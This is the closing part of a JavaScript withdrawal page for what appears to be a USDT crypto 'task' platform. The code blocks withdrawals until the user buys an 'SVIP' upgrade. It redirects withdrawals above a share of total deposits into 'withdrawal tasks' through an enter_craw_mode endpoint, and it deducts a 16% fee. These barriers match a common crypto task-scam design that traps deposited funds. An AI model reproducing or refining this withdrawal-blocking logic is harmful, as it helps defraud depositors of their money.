    showUpgradeToast('<i class="fa-solid fa-circle-exclamation" style="font-size:20px;margin-bottom:8px;display:block;"></i>Insufficient balance.<br>Available: <strong>$' + TOTAL_BAL.toFixed(2) + ' USDT</strong>');
    return;
  }

  // NOTE: MIN_WITHDRAWAL = 1 block intentionally removed.
  // The $9 minimum is already enforced above (amt < 9 check) AND
  // in the backend via the min_withdrawal_amount DB setting.
  // Having a second looser check here (MIN_WITHDRAWAL=1) created a
  // bypass path that allowed $1 withdrawals to pass frontend validation.

  if (SVIP_LEVEL === 0) {
    showUpgradeToast(
      '<i class="fa-solid fa-crown" style="font-size:20px;margin-bottom:8px;display:block;color:#f5d060;"></i>' +
      'Upgrade to <strong>SVIP 1</strong><br>or above to withdraw'
    );
    return;
  }

  if (SVIP_LEVEL >= 1 && !CRAW_DONE && !CRAW_MODE) {
    const crawThreshold = TOTAL_DEP * CRAW_THRESHOLD;
    if (amt > crawThreshold) {
      setBtnLoading(true);
      try {
        const r = await fetch('../api/enter_craw_mode.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'same-origin',
        });
        const d = await r.json();
        if (d.success) {
          showUpgradeToast('<i class="fa-solid fa-list-check" style="font-size:20px;margin-bottom:8px;display:block;"></i>Withdrawal task required.<br>Redirecting...');
          setTimeout(() => { window.location.href = 'tasks.php'; }, 2000);
        } else {
          showUpgradeToast('<i class="fa-solid fa-list-check" style="font-size:20px;margin-bottom:8px;display:block;"></i>Please complete<br>withdrawal tasks first.');
          setTimeout(() => { window.location.href = 'tasks.php'; }, 2500);
        }
      } catch(e) {
        showUpgradeToast('<i class="fa-solid fa-list-check" style="font-size:20px;margin-bottom:8px;display:block;"></i>Please complete<br>withdrawal tasks first.');
        setTimeout(() => { window.location.href = 'tasks.php'; }, 2500);
      } finally {
        setBtnLoading(false);
      }
      return;
    }
  }

  const platformFee = Math.round(amt * 0.16 * 100) / 100;
  const youReceive  = Math.round((amt - platformFee) * 100) / 100;

  if (youReceive <= 0) {
    showUpgradeToast('<i class="fa-solid fa-circle-exclamation" style="font-size:20px;margin-bottom:8px;display:block;"></i>Amount too low<br>after fees are deducted');
    return;
  }

  document.getElementById('mNet').textContent     = net + ' — USDT';
  document.getElementById('mAddr').textContent    = addr;
  document.getElementById('mAmt').textContent     = '$' + amt.toFixed(2);
  document.getElementById('mFee').textContent     = '$' + platformFee.toFixed(2) + ' (16%)';
  document.getElementById('mReceive').textContent = '$' + youReceive.toFixed(2) + ' USDT';

  document.getElementById('modalOverlay').classList.add('open');
  document.body.style.overflow = 'hidden';
}

function setBtnLoading(on) {
  const btn = document.getElementById('submitBtn');
  if (!btn) return;
  const sp = document.getElementById('btnSpin');
  const ic = document.getElementById('btnIc');
  btn.disabled     = on;
  sp.style.display = on ? 'block' : 'none';
  ic.style.display = on ? 'none'  : 'inline';
}

let _ut;
function showUpgradeToast(msg) {
  const t = document.getElementById('upgradeToast');
  t.innerHTML = msg;
  t.classList.add('show');
  clearTimeout(_ut);
  _ut = setTimeout(() => t.classList.remove('show'), 3500);
}

let _tt;
function showToast(msg, err = false) {
  const el = document.getElementById('toast');
  clearTimeout(_tt);
  el.innerHTML = `<i class="fa-solid fa-${err ? 'circle-exclamation' : 'circle-check'}"></i> ${msg}`;
  el.className = 'toast show' + (err ? ' err' : '');
  _tt = setTimeout(() => el.classList.remove('show'), 3500);
}

document.addEventListener('DOMContentLoaded', () => {
  loadLimits();
  updateFee();
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') { closeModal(); closeSupportModal(); }
});
</script>
</body>
</html>